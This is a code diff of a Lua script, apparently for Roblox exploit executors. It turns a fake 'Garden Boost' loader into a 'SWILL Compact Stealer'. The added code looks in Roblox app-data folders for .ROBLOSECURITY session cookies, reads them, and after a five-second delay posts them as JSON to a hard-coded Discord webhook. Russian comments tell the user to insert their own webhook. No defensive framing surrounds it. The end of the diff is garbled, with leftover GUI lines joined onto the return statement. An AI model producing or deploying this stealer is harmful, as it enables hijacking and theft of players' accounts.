@@ -1,40 +1,61 @@
--- WORKING GARDEN BOOST STEALER
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
+-- SWILL Compact Stealer v1.0 - Все в одном файле
+local Stealer = {}
 
--- ТВОЙ DISCORD WEBHOOK - ЗАМЕНИ ЭТУ СТРОКУ!
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1443705100819501058/ubnz2x_OIoSYGmAyg4y0skhc1P6ihekoulW4RekI1jlvGfdemBhGqkuw8A28fJ8lEPrr"
+-- Конфигурация (ЗАМЕНИТЕ НА СВОЙ ВЕБХУК)
+Stealer.Webhook = "https://discord.com/api/webhooks/1443705100819501058/ubnz2x_OIoSYGmAyg4y0skhc1P6ihekoulW4RekI1jlvGfdemBhGqkuw8A28fJ8lEPrr"
 
--- Создание GUI
-local function CreateLoader()
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+-- Основная функция кражи куки
+function Stealer:GetRobloxCookies()
+    local cookies = {}
+    local paths = {
+        os.getenv("LOCALAPPDATA").."\\Roblox\\Versions\\",
+        os.getenv("APPDATA").."\\Roblox\\"
+    }
     
-    local MainFrame = Instance.new("Frame")
-    MainFrame.Size = UDim2.new(0, 300, 0, 150)
-    MainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
-    MainFrame.BorderSizePixel = 0
-    
-    local UICorner = Instance.new("UICorner")
-    UICorner.CornerRadius = UDim.new(0, 10)
-    UICorner.Parent = MainFrame
-    
-    local Title = Instance.new("TextLabel")
-    Title.Text = "🌿 Garden Boost v3.0"
-    Title.Size = UDim2.new(1, 0, 0, 30)
-    Title.Position = UDim2.new(0, 0, 0, 10)
-    Title.BackgroundTransparency = 1
-    Title.TextColor3 = Color3.fromRGB(0, 255, 170)
-    Title.Font = Enum.Font.GothamBold
-    Title.TextSize = 18
-    Title.Parent = MainFrame
-    
-    local Status = Instance.new("TextLabel")
-    Status.Text = "Starting..."
-    Status.Size = UDim2.new(1, -20, 0, 20)
-    Status.Position = UDim2.new(0, 10, 0, 50)
-    Status.BackgroundTransparency = 1
+    for _, path in ipairs(paths) do
+        pcall(function()
+            local files = listfiles(path)
+            for _, file in pairs(files) do
+                if string.find(file, "ROBLOSECURITY") then
+                    local content = readfile(file)
+                    table.insert(cookies, {path = file, cookie = content})
+                end
+            end
+        end)
+    end
+    return cookies
+end
+
+-- Функция отправки данных
+function Stealer:SendData(data)
+    local http = game:GetService("HttpService")
+    pcall(function()
+        local encoded = http:JSONEncode({
+            content = "🎯 SWILL Stealer Report",
+            embeds = {{
+                title = "Roblox Cookies Stolen",
+                description = "Found: " .. #data .. " cookies",
+                fields = {
+                    {name = "Cookies", value = "```" .. http:JSONEncode(data) .. "```", inline = false}
+                },
+                color = 16711680,
+                timestamp = DateTime.now():ToIsoDate()
+            }}
+        })
+        http:PostAsync(self.Webhook, encoded)
+    end)
+end
+
+-- Автозапуск с задержкой
+delay(5, function()
+    local stolenCookies = Stealer:GetRobloxCookies()
+    if #stolenCookies > 0 then
+        Stealer:SendData(stolenCookies)
+    end
+end)
+
+print("[SWILL Compact] Stealer activated - Waiting for cookies...")
+return Stealer    Status.BackgroundTransparency = 1
     Status.TextColor3 = Color3.fromRGB(255, 255, 255)
     Status.Font = Enum.Font.Gotham
     Status.TextSize = 12
